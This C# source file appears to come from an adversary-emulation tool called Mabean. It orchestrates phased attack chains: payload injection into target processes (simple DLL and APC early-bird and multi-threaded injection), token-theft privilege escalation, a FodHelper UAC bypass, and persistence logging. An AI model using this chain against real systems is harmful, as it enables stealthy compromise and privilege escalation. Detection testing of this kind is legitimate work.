using Mabean.Helpers;
using Mabean.Interop;
using Mabean.Models;
using System;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;

namespace Mabean.Services;

public class ChainBehaviorService
{
    private readonly PayloadService _payloadService;

    public ChainBehaviorService(PayloadService payloadService)
    {
        _payloadService = payloadService;
    }

    public async Task RunChainAsync(BehaviorChainDefinition chain)
    {
        if (chain.Persistence is { } persistenceConfig)
        {
            //var config = new { serviceName = persistenceConfig.ServiceName };
            //var json = JsonSerializer.Serialize(config);
            //await File.WriteAllTextAsync(Paths.SessionConfigPath, json);
            //LoggerService.Write($"[Chain] Session config written: {Paths.SessionConfigPath}");
        }

        if (chain.Injection is { } injection)
        {
            LoggerService.Write($"[Chain] Phase 1 - Injection: {injection.Behavior}");
            var payload = await PayloadService.GetPayload(injection.PayloadName);
            switch (injection.Behavior)
            {
                case "Simple":
                    var context = new BehaviorContext
                    {
                        BehaviorName = "Injection-Simple",
                        DllPath = @"C:\ProgramData\Mabean\Dlls\1.dll",
                        TargetPID = injection.TargetPid ?? 0,
                        ProgramName = null,
                        PayloadPath = @"C:\ProgramData\Mabean\Payloads\" +  injection.PayloadName
                    };
                    await WriteBehaviorContext(context);
                    break;
                case "Apc-MultiThreaded":
                    var code4 = InteropInjection.InjectPayloadApcMultiThreaded(injection.TargetPid ?? 0, payload, (nuint)payload.Length, null);
                    LoggerService.Write($"[Chain] APC multi-threaded injection result: {code4}");
                    break;
                case "Apc-EarlyBird":
                    var context2 = new BehaviorContext
                    {
                        BehaviorName = "Injection-Simple",
                        DllPath = Path.Combine(Paths.Dlls, "1.dll").ToString(),
                        TargetPID = injection.TargetPid ?? 0,
                        ProgramName = injection.ProgramName,
                        PayloadPath = injection.PayloadName
                    };
                    await WriteBehaviorContext(context2);
                    var code5 = InteropInjection.InjectPayloadApcEarlyBird(injection.ProgramName!, payload, (nuint)payload.Length, null);
                    LoggerService.Write($"[Chain] APC early bird injection result: {code5}");
                    break;
            }
        }

        if (chain.PrivEsc is { } privEsc)
        {
            LoggerService.Write($"[Chain] Phase 2 - PrivEsc: {privEsc.Behavior}");
            switch (privEsc.Behavior)
            {
                case "TokenTheft":
                    var code1 = InteropPrivilegeEscalation.TokenTheftEscalation(privEsc.TargetPid ?? 0, null);
                    LoggerService.Write($"[Chain] TokenTheft result: {code1}");
                    break;
                case "FodHelperAbuse":
                    Console.WriteLine($"[Chain] FodHelperAbuse command: {privEsc.ExecPath}");
                    var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath, null);
                    LoggerService.Write($"[Chain] FodHelperAbuse result: {code2}");
                    break;
            }
        }

        if (chain.Persistence is { } persistence)
        {
            LoggerService.Write($"[Chain] Phase 3 - Persistence: {persistence.Behavior} (service: {persistence.ServiceName})");
        }
    }

    private async Task WriteBehaviorContext(BehaviorContext ctx)
    {
        var json = JsonSerializer.SerializeToNode(ctx);
        await File.WriteAllTextAsync(Paths.SessionConfigPath, json.ToString());
    }
}
